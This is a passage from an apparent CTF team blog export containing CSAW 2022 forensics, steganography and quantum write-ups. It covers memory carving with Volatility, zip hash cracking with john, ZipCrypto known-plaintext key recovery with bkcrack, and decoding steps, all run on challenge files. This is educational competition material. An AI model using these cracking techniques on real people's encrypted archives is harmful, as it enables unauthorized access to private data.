\n4n6nk8s@csaw2022:~/csaw/dir2$ foremost end.png   \nProcessing: end.png\n|foundat=end.zip.gpgUT\n*|\n```\nA new directory called `output` is created and it contains the extracted files from `end.png` using \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ tree output\noutput\n├── audit.txt\n├── png\n│   └── 00000000.png\n└── zip\n    └── 00000964.zip\n\n2 directories, 3 files\n```\nOK let's unzip the `00000964.zip` file and decipher the `end.zip.gpg` file using `Troll_Tr0ll_TrOll` password and get our flag \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ unzip output/zip/00000964.zip \nArchive:  output/zip/00000964.zip\n  inflating: end.zip.gpg\n4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output end.zip --decrypt end.zip.gpg\n```\nAh finally there is a flag.gif file in end.zip file but wait!! the zip file is protected!\n\nWe've noticed that the encryption is ZipCrypto Deflate which is similar to the other chall, crackable by just knowing 12 bytes of whats inside the zip, 8 of which must be contiguous.\nWe've went ahead, used the header of a GIF file, and digging more into the GIF file structure, we've came to know that in most of the GIF files there is a constant text 'NETSCAPE' at the hexadecimal offset 0x310 which fulfills our needs, 8 bytes contiguous plus the header, we've got more than 12 bytes.\n\nThe header is just `GIF89a` at offset 0x0.\n\n![](https://i.imgur.com/RH9goSf.png)\n\nYou can get bkcrack from [here](https://github.com/kimci86/bkcrack)\n\n-C to specify the ciphered zip, -c for the target file -x to specify known bytes at some offset and -d to get the deciphered data once the process is done, and keys were found!\n\n```\n./bkcrack -C end.zip -c flag.gif -x 0 474946383961 -x 0x310 4E4554534415045322E30 -d deciphered\n```\n\nUnfortunately, it ended with `Could Not find the keys.`\n\nHowever we were not lucky to crack the zip open using bkcrack again.\n\nDon't worry dude! we have rockyou and john! Let's give bruteforcing a chance. We can extract the password hash with `zip2john` command! \n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~/mnt/dir2$ zip2john end.zip > zip.hash  \nver 2.0 efh 5455 efh 7875 end.zip/flag.gif PKZIP Encr: TS_chk, cmplen=61563, decmplen=90082, crc=18A1C7A3 ts=8050 cs=8050 type=8\n```\nNow it's time to bruteforce the hash with rockyou!\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~/mnt/dir2$ john --wordlist=$rockyou zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nNo password hashes left to crack (see FAQ)\n```\nWait what??? The password wasn't found on rockyou! What the hack?? After some investigating we remember that there is a text file called `dic_fr_l33t.txt`! dic means dictionary and fr means french right ? Oh man we need to recover this wordlist! But the user deleted it. I'll give a chance to `linux_find_file`. Let's try to dump this text file. It might be stil loaded in the memory right? \n\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -L | grep dic_fr\nVolatility Foundation Volatility Framework 2.6.1\n3 0xffff88000c135cd8 /media/sf_DUMP/dir1/dic_fr_l33t.txt\nvol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -i 0xffff88000c135cd8 -O dic_fr_l33t.txt\nVolatility Foundation Volatility Framework 2.6.1\n```\nAh God! The extracted file is empty. We need another way to recover the wordlist and with an elegent way\nAfter some minutes of thinking. We decide to use a regex that allow us to collect words that not contains special chars like `{_;}/][-` \n\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~$ strings memory.raw | grep -v \" \\|\\_\\|\\-\\|\\[\\|\\]\\|\\`\\|\\;\\|\\/\\|\\.\\|\\}\\|\\{\" | sort | uniq | sort > myrock.txt\n4n6nk8s@csaw2022:~/mnt/dir2$ sudo john --wordlist=~/myrock.txt zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nCyb3rs3curit3    (end.zip/flag.gif)\n1g 0:00:00:00 DONE (2022-09-12 20:34) 6.666g/s 655360p/s 655360c/s 655360C/s Coup3ri3z..D3fouraillions\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nOh man we did it! The password of the protected `end.zip` is `Cyb3rs3curit3` (CyberSecurité).Let's extract the `flag.gif` file now...\n\n![](https://imgur.com/jZoDJhE.gif)\nLet's convert this gif to frames using `ffmpeg` utility, the magical one xD\n\n```bash Split the gif \n4n6nk8s@csaw2022:~$ mkdir temp ; ffmpeg -i /mnt/dir2/flag.gif -vsync 0 temp/temp%d.png\nInput #0, gif, from 'flag.gif':\n  Duration: 00:00:03.60, start: 0.000000, bitrate: 200 kb/s\n  Stream #0:0: Video: gif, bgra, 290x290, 10 fps, 10 tbr, 100 tbn\nStream mapping:\n  Stream #0:0 -> #0:0 (gif (native) -> png (native))\nPress [q] to stop, [?] for help\nOutput #0, image2, to 'temp/temp%d.png':\n  Metadata:\n    encoder         : Lavf59.27.100\n  Stream #0:0: Video: png, rgba(pc, gbr/unknown/unknown, progressive), 290x290, q=2-31, 200 kb/s, 10 fps, 10 tbn\n    Metadata:\n      encoder         : Lavc59.37.100 png\nframe=   36 fps=0.0 q=-0.0 Lsize=N/A time=00:00:03.60 bitrate=N/A speed=14.8x\nvideo:113kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown\n```\nWe got this images! oh we have 36 QR Code images! Seriously i don't want to scan it manually! \n![](https://imgur.com/aFiEzTR.png)\nLet's Write a small code that reads all these QRcode images! I am too lazy man !\n```python Scan QRCode\nimport cv2\n\nflag=\"\"\nfor i in range(36):\n\n    img=cv2.imread(\"temp\"+str(i+1)+\".png\")\n    det=cv2.QRCodeDetector()\n    val, pts, st_code=det.detectAndDecode(img)\n    flag+=val[::-1]\nprint(flag)\n```\nLet's run the code now ! I wish this nightmare finish dude! I don't another step please\n```bash Run Reader\n4n6nk8s@csaw2022:~$ python3 temp/solve.py\nThe_flag_is:1_Lik3_F0r3nS1c_4nd_y0u?\n```\nAnd Finally we got the flag! \n\n# Quantum Leap : Misc \n+++info Description\nMy friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.\n+++\n\nChallenge Link & WriteUp Author\n\n{% links %}\n- site: Challenge Link \n  url: https://github.com/RaniaMidaoui/CTF-writeups/blob/main/CSAW22/Quantum%20Leap/output.txt\n  desc: CSAW 2022 - Quantum Leap\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Writeup Author - Mida0ui\n  image: https://media-exp1.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1668643200&v=beta&t=FV5YWMygs2bbclfvgFIUtPgjIedq8tGiKWxopxK2_yU\n  desc: Mida0ui Linkedin Profile\n  url: https://www.linkedin.com/in/rania-midaoui-b0163a1bb/\n  color: \"#de2336\"\n{% endlinks %}\n\nThe description mentions that we're dealing with a quantum computer with two qubits, se we can assume that the gate the person used to get the output is a two-qubit quantum logic gate.\n\nA quantum gate is basic quantum circuit operating on a small number of qubits, they perform operations to change the state of the qubits, and unlike many classical logic gates, quantum logic gates are reversible.\nEach quantum gate has its matrix, and since the qubit states are represented with vectors, the gates transform these vectors to get new states.\nThe state vectors of the states |0> and |1> are:\n\n![2022-09-15_19h32_37](https://user-images.githubusercontent.com/68945305/190504993-8094b514-dfa2-472f-8622-59867ef2e061.png)\n\n\nThe CNOT gate was applied, it's a two-qubit quantum gate that performs a controlled NOT where one qubit is the control and the second qubit is the target.\nIts matrix is the following :\n\n![2022-09-15_19h33_11](https://user-images.githubusercontent.com/68945305/190486028-970479de-3ff1-415e-bdd2-b4f0e6c8dab2.png)\n\nWhen applied:\n\n![2022-09-15_20h47_02](https://user-images.githubusercontent.com/68945305/190497970-bd14060b-e413-43b6-982a-17da2d1c18a5.png)\n\nThe mathematics behind these results are simple: \n\nLets take |10> and |11>:\n\n![2022-09-15_21h46_45](https://user-images.githubusercontent.com/68945305/190505635-f998a0df-a328-4230-a3f1-1e3be73a5cef.png)\n\nThis ⊗ represents a tensor product, you can read about it here if you don't know what it is : https://www.math3ma.com/blog/the-tensor-product-demystified\n\nThe first qubit is usually referred to as the control qubit and the second qubit as the target qubit. Expressed in basis states, the CNOT gate:\nleaves the control qubit unchanged and performs a Pauli-X gate or NOT gate (which just flips the state of the qubit) on the target qubit when the control qubit is in state ∣1⟩;\nleaves the target qubit unchanged when the control qubit is in state ∣0⟩.\n\nAs you may have noticed, this challenge can be done manually by converting the output string to binary, taking two bits at a time and checking the value of the most significant bit, if it's 1, the other bit is flipped, else, nothing is done.\n\nI wanted to solve this task with the CNOT gate itself,using the qiskit module in python.\nQiskit is an open-source SDK for working with quantum computers at the level of pulses, circuits, and application modules.\n\nAs mentioned before quantum logic gates are reversible, in this case, when CNOT gate is applied once on the output, we get the flag.\n\nHere's the script, you can run it on jupyter notebook: \n```py Solver\nfrom qiskit import *\n\noutput = 'wxqvn$Zae${deyZv$d\"i'\noutput_array = ''.join(format(i, '08b') for i in bytearray(output, encoding ='utf-8'))\n\nbin_flag = ''\n\ndef state_vect(bit):\n    if(bit == '0'):\n        vect = [1, 0]\n    else : \n        vect = [0 ,1]\n    return vect\n\ni = 0\nwhile i<len(output_array):\n    \n    #Initialize the quantum circuit\n    q = QuantumRegister(2, \"q\")\n    c = ClassicalRegister(2, \"c\")\n    \n    qc = QuantumCircuit(q,c)\n\n    #get the initial state from the output\n    vect0 = state_vect(output_array[i])\n    vect1 = state_vect(output_array[i+1])\n    \n    #initialize the register\n    qc.initialize(vect1,0)\n    qc.initialize(vect0,1)\n    \n    qc.measure(q, c)\n\n    #apply the CNOT gate, q[1] is the control and q[0] is the target\n    qc.cx(q[1],q[0])\n\n    qc.measure(q, c)\n    \n    #execute the circuit\n    qobj = assemble(qc, shots=1)\n    job = execute(qc,Aer.get_backend('qasm_simulator'),shots=1)\n    counts = job.result().get_counts()\n    \n    bin_flag += str(counts)[2:4]\n    \n    #Increment the counter to get the next 2 qubits\n    i=i+2\n    \nflag = ''.join(chr(int(bin_flag[i*8:i*8+8],2)) for i in range(len(bin_flag)//8))\nprint(flag)\n```\nThe flag is `flag{4_qu4ntum_g4t3}`\n\n","slug":"Writeups/csaw2022","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnw000td5qfatjtgudw","content":"<p>CSAW CTF is one of the oldest and biggest CTFs in the world, with more than 900 teams participating in the 2022 edition. We would like to thank the organizers for the stable infrastructure and the creative challenges.</p>\n<p>we finished first in the MENA region and 14th globally</p>\n<p>Kudos to everyone in my team SOter14 for their huge work and efforts, you can catch up with out latest news at <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3RlcjE0LnRlY2g=\">our website</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TT3RlcjE0VGVhbQ==\">twitter page</span></p>\n<p>The contest was fun and challenging, we managed to solve 25 out of the 28 challenges in Pwn, Web, OSINT, Forensics, Steganography, Misc, Quantum Computing, AI, Cryptography, and Reverse Engineering.</p>\n<p>Below are the writeups for forensics challs: Noir, Not Too Taxing (Crypto), and Encrypted disk.</p>\n<h1 id=\"noir-digital-forensics-steganography\"><a class=\"markdownIt-Anchor\" href=\"#noir-digital-forensics-steganography\">#</a> Noir: Digital Forensics / Steganography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>I am a forest, and a night of dark trees: but he who is not afraid of my darkness, will find banks full of roses under my cypresses. Friedrich Nietzsche.</p>\n<p>The image contains a flag in the format (flag)this_is_the_flag</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Noir</p>\n          </div></div><div class=\"item\" title=\"Author - Wen Jun L.\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C5603AQGZdulNxGshvg/profile-displayphoto-shrink_400_400/0/1602081502952?e=1668643200&v=beta&t=XeXg__QTpf__BhQHFkZD7sSsL7PeCEbEXdi-J66JfeU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\">Author - Wen Jun L.</span>\n          <p class=\"desc\">Wen Jun L. Linkedin Profile</p>\n          </div></div></div>\n<p>This challenge blowed our minds, it was part of CSAW’21 Finals and it is a 0-solves chall, so it was offered in the Quals of 2022. We’ve got an image, bit heavy around 9 MB that looks like a scene from a horror game, storm, forest, and darkness. It was a twisted chall!</p>\n<p><img data-src=\"https://github.com/u91o/noir/blob/main/noir.png?raw=true\" alt=\"\"></p>\n<p>First, we tried the normal steganogrpahy ways around it, but obviously that is a total waster of time.</p>\n<p>It had 100+ on Aperisolve alone!</p>\n<p>Technically, the image is merely noise in the three RGB channels whith contrast on few areas, that when included with the alpha channel gives the image as you see it! Amazing, it really feels like some streaming technique, a kind of standard that’s used by TVs to show pictures we can understand. But we neglected the thought of getting a video out of an image, how unfair! Instead we’ve thought of the noise as a raw data that we can feed to Audacity and hopefully get an audible thing out of it, using U-LAW since we’re dealing with RAW data, it made much sense, because we have seen some images filled with noise turning into audio. But a video, insane!</p>\n<p><img data-src=\"https://i.imgur.com/dpalAg1.png\" alt=\"\"></p>\n<p>And of course, it was a video!</p>\n<p>Noir represents a kind of movies, black and white, crime generally, and that’s how we finally went into the idea that we’re dealing with a video rather than an audio.</p>\n<p>The Noir movies are taped to a stripe and played through a wheel showing still images 24 frames a second - Oh, keep that in mind! Still images mean also RAW data. That could help.</p>\n<p>But still we wonder, how to extract the video.<br>\nWell it can’t be manually, there must be a tool, or it would be a total nightmare.</p>\n<p>To save you some time, it was  <code>FFmpeg</code> !!</p>\n<p>FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the command-line ffmpeg tool itself, designed for processing of audiovisual files. Per Wikipedia.</p>\n<p>Well, that means some sort of conversion, right? Yep, but from a single png to what? There are hundreds of video formats out there, some of them are no longer being used.</p>\n<p>But we can narrow our results, to lightweight ones since the image is just 9 MB, 24 fps if that helps, RAW data, so no codecs!</p>\n<p>FFmpeg command to convert formats is basically:</p>\n<figure class=\"highlight bash\"><figcaption><span>ffmpeg command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i <span class=\"built_in\">source</span> -pix_fmt pixelformat  -f rawvideo - &gt; output.extension</span><br></pre></td></tr></table></figure>\n<p>You can specify the frames, although ffmpeg can pretty much detect that automatically.</p>\n<p>We need the pixelformat and the extension. We’re getting close!</p>\n<p>Hmm, since we’re dealing with an image, can’t the extension of the video we’re looking for be both an image extension and a video extension. WEBM answers that. How clever!</p>\n<p>Webm is actually the only extension we’ve found thats a Joker, can be an image/audio/video. Which makes it special. That’s it, by luck, we got it, WEBM.</p>\n<p>However we tried a lot of extenison, it was a game of trial and error, for instance we checked mp4, wmv, avi, mkv, flv, mov, you name it…</p>\n<p>FFmpeg needs a pixel format, well, there is a hude table of these formats…</p>\n<figure class=\"highlight bash\"><figcaption><span>pixels format</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=     yuv420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuyv422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     yuv410p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv411p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      rgb565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      rgb555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        gray, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       monow, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=       monob, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=        pal8, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    yuvj420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      xvmcmc, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=    xvmcidct, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=     uyvy422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=   uyyvyy411, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=      bgr565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      bgr555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        bgr8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        bgr4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   bgr4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   rgb4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     rgb32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     bgr32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    gray16be, nb_channels=   1, depth=  16, is_alpha=n</span><br><span class=\"line\">name=    gray16le, nb_channels=   1, depth=  16, is_alpha=n</span><br></pre></td></tr></table></figure>\n<p>Well, we didn’t guess, we, at this stage, after looking deeply into the image, and as said before, the RGB channels are carrying noise that surely represent the video, however the alpha channel is the one that shape the picture as we see it in the previews. So the pixel format we choose is rgb24 excluding the alpha channel.</p>\n<p>The final command is:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i noir.png -pix_fmt rgb24  -f rawvideo - &gt; vid.webm</span><br></pre></td></tr></table></figure>\n<p>Coool, after all the hustle we’ve got a video, a subway with blinking lights, or should I say, Morse Code!<br>\nThe clock was ticking, we’re at the final hours of the CTF, and the video is 2 mins long.<br>\nCould there be any OpenCV tool for this! Of course, here is a link you might need it as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhemVyMjAxNS9Nb3JzZURlY29kZXI=\">MorseDecoder</span></p>\n<p>Here is a link for the video as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOU5TOTJXblZZMUlNbEc0aHlFWVh2c0U3MWpfbTFDcG8vdmlldz91c3A9c2hhcmluZw==\">video.webm</span></p>\n<p>Using the tool, I let it record my screen and positioned the cross selection on the train lights. Within a minute we’ve got the flag!</p>\n<p><img data-src=\"https://i.imgur.com/wh0uUv2.png\" alt=\"\"></p>\n<p>Finally, it was a creative challenge we must say!</p>\n<p>The flag is  <code>(flag)sil3nt_refl3ct1on</code></p>\n<h1 id=\"not-too-taxing-digital-forensics-cryptography\"><a class=\"markdownIt-Anchor\" href=\"#not-too-taxing-digital-forensics-cryptography\">#</a> Not Too Taxing: Digital Forensics / Cryptography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>We intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can’t figure out the password to the file in order to extract the data. Attached are the two extracted files, Tax_Ret_Form_Blank.pdf and Tax_Ret_Form_Nov_2021.zip, and a transcript of the emails we found, SPBlock_Email.pdf.</p>\n<p>Can you figure out the password so we can get this guy’s info?</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Not Too Taxing</p>\n          </div></div></div>\n<p>In this challenge we were given, an encrypted zip archive containing a filled state tax form document for the month of Novemeber 2021, the emails transmitted between … and the client, as well as the template of the tax form blank.</p>\n<p>We’ve noticed the zip was using the ZipCrypto Store compression, which is breakable if you can find 12 bytes of the data inside the zip, 8 of which got to be contiguous.</p>\n<p>ZipCrypto is considered as the legacy encryption of archives, you must be aware that it is the default method used in most Linux distros: ZipCrypto Deflate. Thus you might want to manually change that method when compressing to AES for higher security.</p>\n<p>The ZipCrypto algorithm generates a pseudo-random stream of bytes/keystream, which is XORed to the entry’s content. to produce the encrypted data. The generator’s state made of three 32-bits integers (keys), is initialized using the password and then contiuously updating as encryption goes on.</p>\n<p>This encryption algorithm is vulnerable to known plaintext attacks to recover the content fully.</p>\n<p>We’re going to use  <code>bkcrack</code>  tool which can recover the content of the archive, change a zip archive’s password, and recover the original password. All by retrieving the zip archive three generated keys.</p>\n<p>The installation is pretty straight forward, just git clone the repo then,</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install</span><br><span class=\"line\">cmake --build build --config Release</span><br><span class=\"line\">cmake --build build --config Release --target install</span><br></pre></td></tr></table></figure>\n<p>Well, we must use the blank tax form as our plaintext attack, as it shares a lot of identical bytes with the filled form inside the zip.</p>\n<p>However you can’t just feed the pdf to bkcrack and hope for it to crack the zip. The tool requires a non encrypted zip with the similar bytes inside to attack the encrypted zip.</p>\n<p>So let’s get our blank form inside a zip and specify the method of encryption as ZipCrypto and the compression level as store. Now we guarantee there are plenty of similar bytes to execute the attack.</p>\n<p><img data-src=\"https://i.imgur.com/ouMza3O.png\" alt=\"\"></p>\n<p>First we retrieve the three keys from the zip archive using</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -c Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Blank.zip -p Tax_Ret_Form_Blank.pdf</span><br></pre></td></tr></table></figure>\n<p>-C: Specifies the encrypted zip archive<br>\n-c: Specifies the target file within the archive<br>\n-P: Specifies the plaintext zip archive<br>\n-p: specifies the plaintext file within the non encrypted archive.</p>\n<p>Now let it process for a while, it should not take long, as we provided more than enough data to bkcrack.</p>\n<p>Here are they keys I have got:</p>\n<figure class=\"highlight bash\"><figcaption><span>result</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b2c4a24e f036ff3a 998f6727</span><br></pre></td></tr></table></figure>\n<p>If the compression wasn’t Store, and instead it was Deflate, then the Github repo provides some python scripts to decompress those types, just first include  <code>-d deciphered</code>  at the end of the previous command.</p>\n<p>Then run:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 tools/inflate.py deciphered decompressed</span><br></pre></td></tr></table></figure>\n<p>In our case, it was just Store, so we move on to the next step, we’re going to recreate the very same archive with a password of our choise, this is the fastest way around Zip crypto archives, you can go ahead and retrieve the password, we will show that. However that process will take a bit longer.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -k b2c4a24e f036ff3a 998f6727 -U unlocked.zip 1234</span><br></pre></td></tr></table></figure>\n<p>And within a second, we got our new archive with the filled document restored successfully!</p>\n<p><img data-src=\"https://i.imgur.com/8x38gOi.png\" alt=\"\"></p>\n<p>And the flag was:  <code>flag&#123;1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u&#125;</code></p>\n<p>However if you want the hard way, you can retrieve the original password of the archive using the three keys, you might need to know the length though, or guess it. Tideous task…</p>\n<p>Anyways, here is the command you would use for that:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -k b2c4a24e f036ff3a 998f6727 -r 8..12 ?p</span><br></pre></td></tr></table></figure>\n<p>-r to specify the length, it can be a rough number or an interval.</p>\n<p>Sorry, I didnt bother to get the password 😃)</p>\n<p>It was a creative challenge. However I must say that we did not check the email content document at all lol!</p>\n<h1 id=\"encrypted-disk-digital-forensics\"><a class=\"markdownIt-Anchor\" href=\"#encrypted-disk-digital-forensics\">#</a> Encrypted Disk: Digital Forensics</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>th31nk encrypted his disk and forgot the password, can you help him? Flag is what you find, no need to wrap</p>\n<p>HINT: Custom Profile</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Encrytped Disk</p>\n          </div></div><div class=\"item\" title=\"Author - Crazyman\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\" data-background-image=\"https://pbs.twimg.com/profile_images/1427918895424282628/NR5jaECn_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" 